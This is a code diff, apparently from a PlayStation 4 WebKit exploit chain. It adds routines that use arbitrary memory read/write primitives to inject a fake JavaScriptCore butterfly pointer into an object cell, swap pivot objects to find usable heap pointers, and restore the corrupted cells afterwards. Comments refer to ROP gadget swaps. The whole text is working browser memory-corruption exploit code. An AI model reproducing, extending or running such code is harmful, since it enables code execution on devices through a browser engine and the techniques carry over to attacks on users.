@@ -507,41 +507,105 @@ export function verifySlabAddrs(p, prep) {
     return out;
 }
 
-/** Heap pointer at pivotCell+0x8 (JSC butterfly) — null on empty {} on 13.52. */
+/** PS4 gigacage / heap pointer (not strict hi>0 — some reads use low-only layout). */
 export function isPlausibleHeapPtr(v) {
     if (!v) return false;
     if (v.hi === 0 && v.low === 0) return false;
     if (v.hi === 0 && v.low < 0x10000) return false;
     if ((v.low & 7) !== 0) return false;
-    return v.hi > 0;
+    const n = (v.hi * 0x100000000) + (v.low >>> 0);
+    if (n >= 0x100000000 && n < 0x1000000000) return true;
+    return v.hi > 0 && v.hi <= 0xffff;
 }
+
+const BF_CELL_OFFS = [0x8, 0x10, 0x18, 0x20];
 
 export function readPivotButterfly(p, pivotCell) {
     if (!p || !pivotCell) return null;
     let q = null;
     try { q = p.read8(pivotCell.add32(0x8)); } catch (_) { q = null; }
-    return isPlausibleHeapPtr(q) ? q : null;
+    return isPlausibleHeapPtr(q) ? { bf: q, cellOff: 0x8 } : null;
 }
 
-/** Empty {} has no butterfly on 13.52 — swap to textarea or prop object for bf hooks. */
-export function ensurePivotButterfly(p, prep, carrier) {
-    if (!prep || !prep.pivotCell)
-        throw new Error("ensurePivotButterfly: no prep");
-    let bf = readPivotButterfly(p, prep.pivotCell);
-    if (bf) return bf;
-    const obj = (carrier && carrier.textarea)
-        ? carrier.textarea
-        : { __p0: 1, __p1: 2, __p2: 3, __p3: 4, __p4: 5 };
+function pivotBfCandidates(carrier) {
+    const out = [];
+    out.push({ tag: "array", obj: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] });
+    out.push({ tag: "props", obj: { __p0: 1, __p1: 2, __p2: 3, __p3: 4, __p4: 5, __p5: 6 } });
+    if (carrier && carrier.textarea)
+        out.push({ tag: "ta", obj: carrier.textarea });
+    try {
+        const ta = document.createElement("textarea");
+        ta.value = "pivot";
+        out.push({ tag: "fresh-ta", obj: ta });
+    } catch (_) { }
+    return out;
+}
+
+function setPivotObj(p, prep, obj, tag) {
     prep.pivotObj = obj;
     prep.pivotCell = p.leakval(obj);
     if (prep.keepAlive && prep.keepAlive.indexOf(obj) < 0)
         prep.keepAlive.push(obj);
-    prep._pivotBfUpgraded = (carrier && carrier.textarea) ? "ta" : "props";
-    bf = readPivotButterfly(p, prep.pivotCell);
-    if (!bf)
-        throw new Error("ensurePivotButterfly: no butterfly after pivot=" + prep._pivotBfUpgraded
-            + " cell=" + prep.pivotCell);
+    prep._pivotBfUpgraded = tag;
+}
+
+/** Write controlled backing store addr into pivotCell+0x8 (empty {} has null butterfly). */
+export function injectFakeButterfly(p, prep) {
+    if (!prep || !prep.pivotCell || !prep._bufAddrOff)
+        throw new Error("injectFakeButterfly: no prep/bufAddrOff");
+    if (!prep._fakeBfAb) {
+        prep._fakeBfAb = new ArrayBuffer(0x80);
+        if (prep.keepAlive) prep.keepAlive.push(prep._fakeBfAb);
+    }
+    const bfAddr = bufAddr(p, prep._bufAddrOff, prep._fakeBfAb);
+    if (!isPlausibleHeapPtr(bfAddr))
+        throw new Error("injectFakeButterfly: fake bf addr bad " + bfAddr);
+    if (!prep._bisect) prep._bisect = {};
+    const site = prep.pivotCell.add32(0x8);
+    if (prep._bisect.fakeBfCellSaved == null) {
+        prep._bisect.fakeBfCellSaved = p.read8(site);
+        prep._bisect.fakeBfCellSite = site;
+    }
+    p.write8(site, bfAddr);
+    prep._pivotBfInjected = true;
+    prep._pivotBfSource = "inject@" + bfAddr;
+    return bfAddr;
+}
+
+/** Resolve butterfly for bf hooks — scan, swap pivot, or inject fake @ cell+0x8. */
+export function ensurePivotButterfly(p, prep, carrier) {
+    if (!prep || !prep.pivotCell)
+        throw new Error("ensurePivotButterfly: no prep");
+    let hit = readPivotButterfly(p, prep.pivotCell);
+    if (hit) {
+        prep._pivotBfSource = "cell+0x" + hit.cellOff.toString(16);
+        return hit.bf;
+    }
+    const cands = pivotBfCandidates(carrier);
+    for (let i = 0; i < cands.length; i++) {
+        const c = cands[i];
+        setPivotObj(p, prep, c.obj, c.tag);
+        hit = readPivotButterfly(p, prep.pivotCell);
+        if (hit) {
+            prep._pivotBfSource = c.tag + "+0x" + hit.cellOff.toString(16);
+            return hit.bf;
+        }
+    }
+    const bf = injectFakeButterfly(p, prep);
     return bf;
+}
+
+export function formatPivotBfDiag(p, pivotCell) {
+    const rows = [];
+    if (!p || !pivotCell) return rows;
+    for (let i = 0; i < BF_CELL_OFFS.length; i++) {
+        const off = BF_CELL_OFFS[i];
+        let val = null;
+        try { val = p.read8(pivotCell.add32(off)); } catch (_) { val = null; }
+        rows.push("+0x" + off.toString(16) + "=" + val
+            + (isPlausibleHeapPtr(val) ? " ok" : ""));
+    }
+    return rows;
 }
 
 /** Read-only — dump pivot object cell for hook offset hunt. */
@@ -709,6 +773,10 @@ function restorePivotHook(p, prep) {
         const site = prep._bisect.pivotSite || prep.pivotCell;
         p.write8(site, prep._bisect.pivotSaved);
     }
+    if (prep._bisect && prep._bisect.fakeBfCellSaved != null && prep._bisect.fakeBfCellSite) {
+        p.write8(prep._bisect.fakeBfCellSite, prep._bisect.fakeBfCellSaved);
+        prep._pivotBfInjected = false;
+    }
 }
 
 /** Swap G5 in live slab (try expm1+0x53642a if table G5 OOMs at fire). */
@@ -834,6 +902,11 @@ export function bisectRestorePivotOnly(p, prep) {
             p.write8(site, bis.pivotSaved);
             restored = 1;
         }
+    }
+    if (bis && bis.fakeBfCellSaved != null && bis.fakeBfCellSite) {
+        p.write8(bis.fakeBfCellSite, bis.fakeBfCellSaved);
+        prep._pivotBfInjected = false;
+        restored++;
     }
     if (restored > 0)
         prep._bisect = {};
